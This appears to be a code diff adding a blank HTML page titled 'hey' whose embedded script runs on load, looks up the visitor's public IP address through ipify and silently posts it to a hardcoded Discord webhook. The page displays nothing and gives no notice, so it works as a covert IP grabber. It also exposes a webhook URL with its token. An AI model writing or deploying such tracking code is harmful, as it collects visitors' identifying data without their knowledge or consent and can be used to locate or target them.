@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>hey</title>
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+        <script type="text/javascript">
+            function discord_message(message) {
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", "https://discord.com/api/webhooks/1348309999335510109/SY7cYodtc-dSCnFExKkluwaeZnGF8tuBkV9atblGwBB3uvqw39s-MwnyRvRZEIO5b7Zp", true);
+                xhr.setRequestHeader('Content-Type', 'application/json');
+                xhr.send(JSON.stringify({
+                'content': message,
+                'username':'fuck',
+            }));
+            }
+            fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                discord_message(data.ip);
+            })
+        </script>
+    </head>
+    <body>
+    
+    </body>
+</html>
